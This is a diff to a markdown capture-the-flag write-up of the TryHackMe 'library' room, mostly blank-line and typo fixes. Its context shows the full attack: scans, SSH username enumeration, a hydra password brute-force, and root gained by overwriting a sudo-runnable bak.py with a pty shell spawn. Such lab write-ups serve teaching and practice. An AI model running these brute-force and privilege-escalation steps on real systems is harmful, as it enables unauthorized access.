@@ -106,11 +106,8 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ===============================================================
 2020/08/21 20:38:47 Finished
 ===============================================================
-
 ```
-
 ## nikto
-
 ```
 CTF/tryhackme/library$ nikto -h $IP
 - Nikto v2.1.6
@@ -136,14 +133,12 @@ CTF/tryhackme/library$ nikto -h $IP
 + End Time:           2020-08-22 13:37:08 (GMT1) (274 seconds)
 ---------------------------------------------------------------------------
 + 1 host(s) tested
-
 ```
 Nothing much here to look at.
 
 ## webpage discovery
 
 Highlighted in the nikto and gobuster common.txt report, we can have a look at the robots.txt and see what it provides us with.
-
 ```
 User-agent: rockyou 
 Disallow: /
@@ -176,10 +171,8 @@ OpenSSH < 7.7 - User Enumeration (2)                                            
 OpenSSHd 7.2p2 - Username Enumeration                                           | linux/remote/40113.txt
 -------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-
 ```
 Well we are in luck. Lets look at the username enumeration.
-
 ```
 msf5 auxiliary(scanner/ssh/ssh_enumusers) > set username meliodas
 username => meliodas
@@ -190,9 +183,8 @@ msf5 auxiliary(scanner/ssh/ssh_enumusers) > run
 [+] 10.10.60.21:22 - SSH - User 'meliodas' found
 [*] Scanned 1 of 1 hosts (100% complete)
 [*] Auxiliary module execution completed
-
 ```
-I was pleased as punch with this as when I went to use hydra I was successful. I then went back and checked if the other name was there - rockyou, and to hell with it, I even threw in a jimbob. All came back positive!!! SO not sure how successful that was.
+I was pleased as punch with this as when I went to use hydra I was successful. I then went back and checked if the other name was there - rockyou, and to hell with it, I even threw in a jimbob. All came back positive!!! So not sure how successful that was.
 
 ## hydra
 ```
@@ -211,9 +203,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2020-08-22 14:50:
 [ERROR] 7 targets did not resolve or could not be connected
 [ERROR] 0 targets did not complete
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-08-22 14:51:53
-
 ```
-
 Next steps - lets check out the ssh with the username and new password.
 
 ## ssh
@@ -237,7 +227,6 @@ meliodas@ubuntu:~$ cat user.txt
 <insert-user-flag-here>
 ```
 So after a quick look around we have the user flag and able to view a bak.py file. To me it looks as though it backs up the website on the server.
-
 ```
 meliodas@ubuntu:~$ cat bak.py 
 #!/usr/bin/env python
@@ -264,12 +253,10 @@ User meliodas may run the following commands on ubuntu:
     (ALL) NOPASSWD: /usr/bin/python* /home/meliodas/bak.py
 ```
 Looks like we can use python (any variant) on the bak.py file in our home folder. Lets run it and see what happens.
-
 ```
 meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
 ```
-To be honest, I spend a fair time, about an hour trying to see how I could amend the file, with only read access. In the end I tried to delete it and then used a new file, with the same name but this time with an interactive shell hopefully waiting at the other end.
-
+To be honest, I spent a fair time, about an hour trying to see how I could amend the file, with only read access. In the end I tried to delete it and then created a new file, with the same name but this time with an interactive shell hopefully waiting at the other end.
 ```
 meliodas@ubuntu:~$ rm bak.py 
 rm: remove write-protected regular file 'bak.py'? yes
@@ -284,7 +271,7 @@ SyntaxError: invalid syntax
 meliodas@ubuntu:~$ echo 'import pty;pty.spawn("/bin/bash")' > bak.py
 meliodas@ubuntu:~$ sudo /usr/bin/python3 /home/meliodas/bak.py
 ```
-I had some issues iniotially as my bash reverse shell had python in the main line. Once I removed that, it worked fine and I had access to root. Quick cat command later and I had the root flag.
+I had some issues initially as my bash reverse shell had python in the main line. Once I removed that, it worked fine and I had access to root. Quick cat command later and I had the root flag.
 ``` 
 root@ubuntu:~# id
 uid=0(root) gid=0(root) groups=0(root)
